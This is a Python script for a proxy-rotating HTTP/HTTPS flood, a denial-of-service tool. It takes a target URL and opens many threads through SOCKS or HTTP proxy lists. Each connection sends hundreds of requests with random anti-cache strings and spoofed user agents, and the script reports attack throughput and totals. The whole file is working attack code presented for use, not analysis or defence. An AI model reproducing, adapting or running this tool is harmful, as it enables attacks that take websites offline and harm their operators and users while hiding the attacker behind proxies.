#!/usr/bin/env python
#version: beta-2.2
import threading
import argparse
import logging
import random
import atexit
import socket
import socks
import time
import ssl
import sys
import os

parser = argparse.ArgumentParser()
parser.add_argument("url", nargs="?", type=str, help="Target URL. Format: \"http(s)://example.com/path/index.php?param1=param1_value&param2=param2_value\"")
parser.add_argument("proxy_list", nargs="?", type=str, help="Proxy list file. Closes when file is invalid")
parser.add_argument("proxy_type", nargs="?", type=str, help="Proxy list type. Proxy Types: SOCKS5, SOCKS4, HTTP")
parser.add_argument("-p", "--port", type=int, default=80, help="URL host's port. Sets to 443 when using HTTPS protocol")
parser.add_argument("-m", "--method", type=str, default="GET", help="HTTP request method. Default: GET")
parser.add_argument("-t", "--threads", type=int, default=100, help="Max threads. Default: 100")
parser.add_argument("-d", "--debug", action="store_true", help="Enables debug mode")
parser.add_argument("--delay", type=int, default=5, help="Delay seconds to send HTTP requests. Default: 5")
parser.add_argument("--timeout", type=int, default=5, help="Set default socket connection timeout. Default: 5")
parser.add_argument("--rpp", type=int, default=777, help="Set requests per proxy. Default: 777")

parser.set_defaults(debug=False)

args = parser.parse_args()

use_proxy = True

if not args.url:
    parser.print_help()
    print("URL is required. Example: https://example.com/path/")
    sys.exit()
    
if not args.proxy_list:
    use_proxy = False
    
if not args.proxy_type and use_proxy:
    parser.print_help()
    print("Proxy type is required. Example: SOCKS5, SOCKS4, HTTP")
    sys.exit()

if args.port < 1 or args.port > 65535:
    print("Port number must be 1-65535")
    sys.exit()

if args.threads < 1:
    print("Invalid thread value. Minimum is 1")
    sys.exit()

if args.debug:
    debug = True

url = args.url
proxy_list = args.proxy_list
proxy_type = args.proxy_type
port = args.port
method = args.method
max_threads = args.threads
debug = args.debug
timeout = args.timeout
rpp = args.rpp
delay = args.delay

if debug:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%H:%m:%S",
        level=logging.DEBUG
    )
else:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%H:%m:%S",
        level=logging.INFO
    )

logger = logging.getLogger(__file__)
url = url.strip()

try:
    protocol, url = url.split("://")
except ValueError:
    print("Invalid URL format! Format: https://example.com/path/")
    sys.exit()
except Exception as e:
    print(f"Protocol/URL Split Error: {e}")
    sys.exit()

try:
    url, path = url.split("/", 1)
except ValueError:
    path = ""
    pass
except Exception as e:
    print(f"URL/Path Split Error: {e}")
    sys.exit()

try:
    path, parameters = path.split("?")
except ValueError:
    parameters = ""
    pass
except Exception as e:
    print(f"Path/Parameters Split Error: {e}")
    sys.exit()

protocol_list = ["HTTP", "HTTPS"]

protocol = protocol.upper()
if not protocol in protocol_list:
    print(f"Invalid protocol: {protocol}")
    sys.exit()
if protocol == "HTTPS":
    port = 443
path = f"/{path}"
if use_proxy:
    proxy_type = proxy_type.upper()
parameters_str = parameters
if parameters != "":
    parameters = f"&{parameters}"

if use_proxy:
    try:
        proxy_file = open(proxy_list, "r")
        proxies = proxy_file.readlines()
        proxy_file.close()
    except FileNotFoundError:
        print(f"Proxy list file not found!")
        sys.exit()
    except Exception as e:
        print(f"Cannot open proxy list file: {e}")
        sys.exit()

    proxy_types = ["SOCKS4", "SOCKS5", "HTTP"]

    try:
        proxy_type_str = proxy_type
        if not proxy_type in proxy_types:
            raise AttributeError
        proxy_type = getattr(socks, proxy_type)
    except AttributeError:
        print(f"{proxy_type} is not a valid proxy type! Proxy Types: SOCKS5, SOCKS4, HTTP")
        sys.exit()
    except Exception as e:
        print(f"Proxy Type Error: {e}")
        sys.exit()

if timeout != None:
    try:
        timeout = int(timeout)
    except Exception as e:
        print(f"Set Default Timeout Error: {e}")
        sys.exit()

try:
    url_ip = socket.gethostbyname(url)
except Exception as e:
    print(f"Unable to resolve domain's IP")
    url_ip = "Unable to resolve"

if url == url_ip:
    url_ip = ""
else:
    url_ip = f"Domain IP: {url_ip}\r\n"

if use_proxy:
    proxies_length = len(proxies)

#You can uncomment this if you want.
#print(f"[---] Attack Information [---]\r\nProtocol: {protocol}\r\nURL: {url}\r\n{url_ip}Port: {port}\r\nPath: {path}\r\nParameters: {parameters_str}\r\nMethod: {method}\r\nProxy List: {proxy_list}\r\nProxy Type: {proxy_type_str}\r\nProxies: {proxies_length}\r\nTimeout: {timeout}\r\nMax Thread: {max_threads}\r\nDebug: {debug}\r\n")

try:
    input("Press enter to initialize the attack.")
except KeyboardInterrupt:
    sys.exit()

if sys.platform == "linux":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")

logger.info("Initializing components...")

active_threads = 0
chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
chars_list = list(chars)
hrs = 0
Bps = 0
total_hrs = 0
total_Bps = 0
total_socks_used = 0
initial_attack_time = 0

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:27.0) Gecko/20100101 Firefox/27.0",
    "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) ",
    "msnbot-131-253-46-102.search.msn.com",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
    "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) ",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/534.34 (KHTML,like Gecko) PhantomJS/1.9.0 (development) Safari/534.34",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
]

logger.info("Done!")

def HTTPS(host, port, proxy_type, proxy_host=None, proxy_port=None):
    try:
        global active_threads
        global hrs
        global Bps
        global total_hrs
        global total_Bps
        global total_socks_used
        active_threads += 1
        port = int(port)
        proxy_port = int(port)
        rp = int(rpp)
        if use_proxy:
            sock = socks.socksocket()
            sock.set_proxy(proxy_type, proxy_host, proxy_port)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        total_socks_used += 1
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)
        for _ in range(rp):
            anti_cache_list = random.choices(chars_list, k=77)
            anti_cache = "".join(anti_cache_list)
            user_agent = random.choices(user_agents)
            http = f"{method} {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\nConnection: close\r\n\r\n"
            sent_bytes = sock.send(http.encode())
            Bps += sent_bytes
            hrs += 1
            total_hrs += 1
            total_Bps += sent_bytes
            time.sleep(delay)
    except Exception as e:
        logger.debug(f"HTTPS Error: {e}")
        pass
    finally:
        active_threads -= 1

def HTTP(host, port, proxy_type, proxy_host=None, proxy_port=None):
    try:
        global active_threads
        global hrs
        global Bps
        global total_hrs
        global total_Bps
        global total_socks_used
        active_threads += 1
        port = int(port)
        if use_proxy:
            proxy_port = int(proxy_port)
        rp = int(rpp)
        if use_proxy:
            sock = socks.socksocket()
            sock.set_proxy(proxy_type, proxy_host, proxy_port)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        total_socks_used += 1
        for _ in range(rp):
            anti_cache_list = random.choices(chars_list, k=77)
            anti_cache = "".join(anti_cache_list)
            user_agent = random.choices(user_agents)
            http = f"{method} {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\nConnection: close\r\n\r\n"
            sent_bytes = sock.send(http.encode())
            Bps += sent_bytes
            hrs += 1
            total_hrs += 1
            total_Bps += sent_bytes
            time.sleep(delay)
    except Exception as e:
        logger.debug(f"HTTP Error: {e}")
        pass
    finally:
        active_threads -= 1

def verbose_status():
    try:
        global hrs
        global Bps
        separator = " " * 6
        while True:
            time.sleep(1)
            print(f"Threads: \u001b[32;1m{active_threads}\u001b[0;0m {separator[len(str(active_threads)):]} HR/s: \u001b[32;1m{hrs}\u001b[0;0m {separator[len(str(hrs)):]} kB/s: \u001b[32;1m{Bps / 1000:.2f}\u001b[0;0m")
            hrs = 0
            Bps = 0
    except Exception as e:
        print(f"Error initializing verbose status: {e}")
        sys.exit()

def main():
    try:
        global initial_attack_time
        initial_attack_time = time.time()
        logger.info("Initializing attack...\r\n")        
        threading.Thread(target=verbose_status, daemon=True).start()
        if use_proxy:
            while True:
                for proxy in proxies:
                    proxy = proxy.strip()
                    proxy_host, proxy_port = proxy.split(":")
                    while True:
                        if active_threads >= max_threads:
                            continue
                        threading.Thread(target=eval(protocol), args=[url, port, proxy_type, proxy_host, proxy_port], daemon=True).start()
                        break
        else:
            while True:
                if active_threads >= max_threads:
                    continue
                threading.Thread(target=eval(protocol), args=[url, port]).start()
    except Exception as e:
        print(f"Main Error: {e}")
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()

def onexit():
    try:
        print("\r\n")
        logging.info("Attack finished\r\n")
        print(f"Duration: \u001b[32;1m{(time.time() - initial_attack_time):.2f} seconds\u001b[0;0m\r\nTotal Socks: \u001b[32;1m{total_socks_used}\u001b[0;0m\r\nTotal HTTP: \u001b[32;1m{total_hrs}\u001b[0;0m\r\nTotal Bandwidth: \u001b[32;1m{(total_Bps / 1000):.2f} kB\u001b[0;0m\r\n")
    except Exception:
        pass

atexit.register(onexit)

if __name__ == "__main__":
    main()
